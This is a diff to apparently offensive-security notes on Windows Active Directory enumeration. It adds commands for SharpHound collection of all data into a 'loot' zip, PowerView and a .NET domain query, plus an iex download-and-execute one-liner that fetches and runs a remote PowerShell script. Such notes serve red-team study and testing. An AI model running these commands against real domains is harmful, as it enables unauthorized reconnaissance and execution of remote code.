@@ -68,11 +68,29 @@ OR If already running-
 #### download
 ```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```
 
-# Powerview
+# Active Directory Enumeration
+```
+$ADClass=[System.DirectoryServices.ActiveDirectory.Domain]
+$ADClass::GetCurrentDomain()
+```
+
+[AD Enumeration Scripts](https://github.com/conma293/ActiveDirectory)
+
+#### Bloodhound
+
+SharpHound Collectors - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/
+```
+. .\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.lab -OutputDirectory C:\Temp -ZipFileName loot123.zip
+```
+
+#### Powerview
 ```. .\PowerView.ps1```
 
 Readme - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 
+#### AD Module
+Import AD Module without RSAT - ```iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory```
 #### Machines
 
 ```Get-DomainComputer```
